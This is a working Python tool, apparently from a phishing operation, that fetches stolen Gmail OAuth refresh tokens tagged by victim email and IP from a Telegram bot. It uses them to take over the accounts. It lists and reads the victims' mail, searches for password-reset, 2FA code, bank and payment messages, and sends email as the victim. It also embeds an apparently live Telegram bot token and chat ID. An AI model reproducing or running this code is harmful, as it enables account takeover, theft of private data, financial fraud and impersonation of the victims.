#!/usr/bin/env python3
"""
gmail_replay.py — Run on your local machine
Paste a refresh token or fetch from Telegram
"""

import requests
import json
import base64
import sys

# === GOOGLE OAUTH CONFIG (same as server) ===
CLIENT_ID = "YOUR_CLIENT_ID.apps.googleusercontent.com"
CLIENT_SECRET = "YOUR_CLIENT_SECRET"

# === TELEGRAM CONFIG (for fetching tokens) ===
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

def refresh_access_token(refresh_token):
    url = "https://oauth2.googleapis.com/token"
    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": refresh_token,
        "grant_type": "refresh_token"
    }
    resp = requests.post(url, json=payload)
    if resp.status_code != 200:
        return None
    return resp.json().get("access_token")

def list_emails(access_token, max_results=10, query=""):
    url = "https://gmail.googleapis.com/gmail/v1/users/me/messages"
    params = {"maxResults": max_results, "q": query}
    headers = {"Authorization": f"Bearer {access_token}"}
    resp = requests.get(url, headers=headers, params=params)
    if resp.status_code != 200:
        return []
    return resp.json().get("messages", [])

def get_email_content(access_token, message_id):
    url = f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{message_id}"
    headers = {"Authorization": f"Bearer {access_token}"}
    params = {"format": "full"}
    resp = requests.get(url, headers=headers, params=params)
    if resp.status_code != 200:
        return None
    return resp.json()

def decode_base64(data):
    try:
        data = data.replace("-", "+").replace("_", "/")
        padded = data + "=" * (4 - len(data) % 4) if len(data) % 4 else data
        return base64.b64decode(padded).decode("utf-8", errors="replace")
    except:
        return "[Binary content]"

def extract_body(payload):
    if "parts" in payload:
        for part in payload["parts"]:
            if part.get("mimeType") == "text/plain" and "data" in part.get("body", {}):
                return decode_base64(part["body"]["data"])
            elif part.get("mimeType") == "text/html" and "data" in part.get("body", {}):
                return decode_base64(part["body"]["data"])
            if "parts" in part:
                result = extract_body(part)
                if result:
                    return result
    elif "data" in payload.get("body", {}):
        return decode_base64(payload["body"]["data"])
    return "[No readable body]"

def get_header(headers, name):
    for h in headers:
        if h["name"].lower() == name.lower():
            return h["value"]
    return "N/A"

def fetch_tokens_from_telegram():
    """Pull Gmail OAuth tokens from Telegram messages"""
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/getUpdates"
    resp = requests.get(url)
    updates = resp.json().get("result", [])
    
    tokens = {}
    for upd in updates:
        text = upd.get("message", {}).get("text", "")
        if "[+]___ GMAIL_OAUTH ___[+]" in text:
            lines = text.split("\n")
            email = token = ip = "?"
            for line in lines:
                if line.startswith("Victim:"):
                    email = line.split(": ", 1)[1].strip()
                if line.startswith("Token:"):
                    token = line.split(": ", 1)[1].strip()
                if line.startswith("IP:"):
                    ip = line.split(": ", 1)[1].strip()
            if email and token and email not in tokens:
                tokens[email] = {"token": token, "ip": ip}
    
    return tokens

def interactive_mode():
    print("\n=== Gmail Token Replay ===\n")
    
    # First, try to fetch from Telegram
    print("[+] Checking Telegram for captured tokens...")
    tokens = fetch_tokens_from_telegram()
    
    if tokens:
        print(f"\nFound {len(tokens)} victim(s) in Telegram:\n")
        emails = list(tokens.keys())
        for i, email in enumerate(emails, 1):
            print(f"  {i}. {email} (IP: {tokens[email]['ip']})")
        
        choice = input(f"\nSelect (1-{len(emails)}, or 'paste' to enter a token manually): ").strip()
        
        if choice.lower() == 'paste':
            refresh_token = input("Paste refresh token: ").strip()
        else:
            try:
                idx = int(choice) - 1
                refresh_token = tokens[emails[idx]]["token"]
            except:
                print("[!] Invalid selection.")
                refresh_token = input("Paste refresh token: ").strip()
    else:
        print("[!] No tokens found in Telegram.")
        refresh_token = input("Paste refresh token manually: ").strip()
    
    access_token = refresh_access_token(refresh_token)
    if not access_token:
        print("[!] Could not get access token. Check client ID/secret.")
        return
    
    # Get victim email
    try:
        userinfo = requests.get(
            "https://www.googleapis.com/oauth2/v2/userinfo",
            headers={"Authorization": f"Bearer {access_token}"}
        ).json()
        victim_email = userinfo.get("email", "unknown")
    except:
        victim_email = "unknown"
    
    print(f"\n{'='*60}")
    print(f"[+] Connected as: {victim_email}")
    print(f"{'='*60}")
    
    while True:
        print("\n--- GMAIL REPLAY MENU ---")
        print("1. List recent 10 emails")
        print("2. List recent 30 emails")
        print("3. Read a specific email")
        print("4. Search by keyword")
        print("5. Quick hunt: passwords + security")
        print("6. Quick hunt: banks + payments")
        print("7. Quick hunt: invoices + receipts")
        print("8. Send email as victim")
        print("9. View profile info")
        print("0. Exit")
        
        choice = input("\n[>] ").strip()
        
        if choice == "1":
            messages = list_emails(access_token, 10)
            if not messages:
                print("[!] No emails.")
                continue
            for i, msg in enumerate(messages, 1):
                d = get_email_content(access_token, msg["id"])
                if d:
                    h = d["payload"]["headers"]
                    s = get_header(h, "Subject")[:60]
                    f = get_header(h, "From")[:40]
                    print(f"  {i}. {f} | {s}")
        
        elif choice == "2":
            messages = list_emails(access_token, 30)
            if not messages:
                print("[!] No emails.")
                continue
            for i, msg in enumerate(messages, 1):
                d = get_email_content(access_token, msg["id"])
                if d:
                    h = d["payload"]["headers"]
                    s = get_header(h, "Subject")[:60]
                    print(f"  {i}. {s}")
        
        elif choice == "3":
            mid = input("Message ID: ").strip()
            c = get_email_content(access_token, mid)
            if c:
                h = c["payload"]["headers"]
                print(f"\nFrom: {get_header(h, 'From')}")
                print(f"Subject: {get_header(h, 'Subject')}")
                print(f"Date: {get_header(h, 'Date')}")
                print(f"\n--- BODY ---")
                print(extract_body(c["payload"])[:2000])
        
        elif choice == "4":
            kw = input("Search: ").strip()
            msgs = list_emails(access_token, 20, kw)
            if msgs:
                print(f"{len(msgs)} results:")
                for m in msgs:
                    d = get_email_content(access_token, m["id"])
                    if d:
                        h = d["payload"]["headers"]
                        print(f"  {get_header(h, 'Subject')}")
        
        elif choice == "5":
            for t in ["password", "reset", "2fa", "otp", "verification", "recover", "authenticator"]:
                msgs = list_emails(access_token, 3, t)
                if msgs:
                    print(f"\n[{t.upper()}]")
                    for m in msgs:
                        d = get_email_content(access_token, m["id"])
                        if d:
                            h = d["payload"]["headers"]
                            print(f"  {get_header(h, 'From')[:35]} | {get_header(h, 'Subject')[:65]}")
        
        elif choice == "6":
            for t in ["bank", "payment", "paypal", "venmo", "chase", "capital one", "transfer"]:
                msgs = list_emails(access_token, 3, t)
                if msgs:
                    print(f"\n[{t.upper()}]")
                    for m in msgs:
                        d = get_email_content(access_token, m["id"])
                        if d:
                            h = d["payload"]["headers"]
                            print(f"  {get_header(h, 'From')[:35]} | {get_header(h, 'Subject')[:65]}")
        
        elif choice == "7":
            for t in ["invoice", "receipt", "order", "amazon", "purchase"]:
                msgs = list_emails(access_token, 3, t)
                if msgs:
                    print(f"\n[{t.upper()}]")
                    for m in msgs:
                        d = get_email_content(access_token, m["id"])
                        if d:
                            h = d["payload"]["headers"]
                            print(f"  {get_header(h, 'From')[:35]} | {get_header(h, 'Subject')[:65]}")
        
        elif choice == "8":
            to = input("To: ").strip()
            subj = input("Subject: ").strip()
            body = input("Body: ").strip()
            msg = f"From: me\r\nTo: {to}\r\nSubject: {subj}\r\n\r\n{body}"
            encoded = base64.urlsafe_b64encode(msg.encode()).decode()
            r = requests.post(
                "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
                headers={"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"},
                json={"raw": encoded}
            )
            print(f"[+] Sent!" if r.ok else f"[!] Failed: {r.text}")
        
        elif choice == "9":
            u = requests.get("https://www.googleapis.com/oauth2/v2/userinfo",
                headers={"Authorization": f"Bearer {access_token}"}).json()
            for k, v in u.items():
                print(f"  {k}: {v}")
        
        elif choice == "0":
            print("Bye.")
            break

if __name__ == "__main__":
    interactive_mode()
